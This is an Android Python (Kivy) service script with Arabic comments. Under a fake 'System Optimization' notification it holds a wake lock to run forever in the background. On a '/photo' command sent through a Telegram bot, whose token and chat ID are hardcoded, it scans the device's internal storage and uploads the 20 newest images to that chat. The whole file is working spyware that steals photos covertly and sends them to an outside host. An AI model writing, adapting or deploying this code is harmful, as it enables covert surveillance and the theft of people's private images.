import os
import time
import threading
import telebot
from jnius import autoclass

# إعدادات أندرويد لضمان البقاء حياً في الخلفية
PythonService = autoclass('org.kivy.android.PythonService')
Context = autoclass('android.content.Context')
NotificationBuilder = autoclass('android.app.Notification$Builder')
NotificationChannel = autoclass('android.app.NotificationChannel')
NotificationManager = autoclass('android.app.NotificationManager')
Build = autoclass('android.os.Build')
PowerManager = autoclass('android.os.PowerManager')

service = PythonService.mService
context = service.getApplicationContext()

# تشغيل الـ WakeLock لمنع المعالج من النوم
power = context.getSystemService(Context.POWER_SERVICE)
wake_lock = power.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ShadowCore::DeepScan")
wake_lock.acquire()

# إعداد إشعار الخدمة (الدرع)
def start_foreground():
    CHANNEL_ID = "shadow_system_channel"
    nm = context.getSystemService(Context.NOTIFICATION_SERVICE)
    if Build.VERSION.SDK_INT >= 26:
        channel = NotificationChannel(CHANNEL_ID, "System Background Sync", NotificationManager.IMPORTANCE_LOW)
        nm.createNotificationChannel(channel)
        builder = NotificationBuilder(context, CHANNEL_ID)
    else:
        builder = NotificationBuilder(context)

    notification = builder.setContentTitle("System Optimization") \
                          .setContentText("Scanning for system stability...") \
                          .setSmallIcon(context.getApplicationInfo().icon) \
                          .build()
    service.startForeground(101, notification)

# إعدادات البوت
BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
CHAT_ID = "6110903337"
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

def scan_all_storage():
    """يبحث في كامل الذاكرة الداخلية عن الصور"""
    base_path = "/storage/emulated/0/"
    found_images = []
    
    # قائمة المجلدات التي يفضل تجاهلها لسرعة البحث (مثل مجلدات النظام الصغير)
    exclude_dirs = ['Android', '.thumbnail', 'cache']

    try:
        for root, dirs, files in os.walk(base_path):
            # تخطي المجلدات غير الضرورية
            dirs[:] = [d for d in dirs if d not in exclude_dirs]
            
            for file in files:
                if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                    try:
                        full_path = os.path.join(root, file)
                        # حفظ المسار مع وقت التعديل لترتيبها
                        found_images.append((full_path, os.path.getmtime(full_path)))
                    except:
                        continue
    except Exception as e:
        print(f"Scan Error: {e}")

    # ترتيب الصور من الأحدث إلى الأقدم
    found_images.sort(key=lambda x: x[1], reverse=True)
    # إرجاع أول 20 صورة وجدها
    return [img[0] for img in found_images[:20]]

@bot.message_handler(commands=['photo'])
def handle_photo_request(message):
    bot.send_message(CHAT_ID, "🔎 جاري مسح الذاكرة بالكامل، انتظر لحظة...")
    all_photos = scan_all_storage()
    
    if not all_photos:
        bot.send_message(CHAT_ID, "❌ لم يتم العثور على أي صور في الذاكرة!")
        return

    for photo_path in all_photos:
        try:
            with open(photo_path, 'rb') as img:
                bot.send_photo(CHAT_ID, img, caption=f"📄 {os.path.basename(photo_path)}")
            time.sleep(1) # تأخير بسيط لتجنب حظر التليجرام
        except Exception as e:
            continue

def run_bot():
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=20)
        except Exception:
            time.sleep(10)

if __name__ == '__main__':
    start_foreground()
    # تشغيل البوت في خيط منفصل
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # إبقاء الخدمة حية للأبد
    while True:
        time.sleep(30)
